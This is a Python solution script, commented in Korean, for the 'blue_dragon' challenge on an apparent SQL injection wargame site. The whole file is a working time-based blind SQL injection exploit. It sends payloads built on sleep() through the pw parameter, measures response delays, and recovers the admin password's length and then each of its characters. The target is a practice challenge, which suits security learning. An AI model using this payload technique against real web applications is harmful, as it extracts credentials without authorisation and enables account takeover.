import requests
from settings import session_id


# 기본 설정
url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
cookies = {'PHPSESSID': session_id}


# 비밀번호 자릿수 확인
# - 1부터 50까지 테스트
def find_pw_length():
    for n in range(1, 50 + 1):
        payload = f"?pw=' or if(id='admin' and length(pw)={n},sleep(1),1)%23"
        res = requests.get(url + payload, cookies=cookies)

        # 조건문이 참이면 응답 지연 발생, 조건이 거짓이면 즉시 응답
        # 응답 시간이 짧으면 length(email)>{n} 구문이 거짓, 최초의 n 값 탐색
        if res.elapsed.total_seconds() > 1:
            return n
    return


# 구한 비밀번호 길이 값을 가지고 비밀번호 값을 구하는 함수
def find_pw(length):
    pw = str()
    for i in range(1, length + 1):
        for j in range(33, 127):
            payload = "?pw=' or if(id='admin' and ascii(substr(pw,{},1))={},sleep(1),1)%23".format(i, j)
            res = requests.get(url + payload, cookies=cookies)

            # 응답 시간이 길면 해당 위치의 문자가 j에 해당
            if res.elapsed.total_seconds() > 1:
                char = chr(j)
                pw += char
                print(pw)
                break
    return pw


pw_length = find_pw_length()
print(f"Password length: {pw_length}")
pw = find_pw(pw_length)
print(f"Password: {pw}")
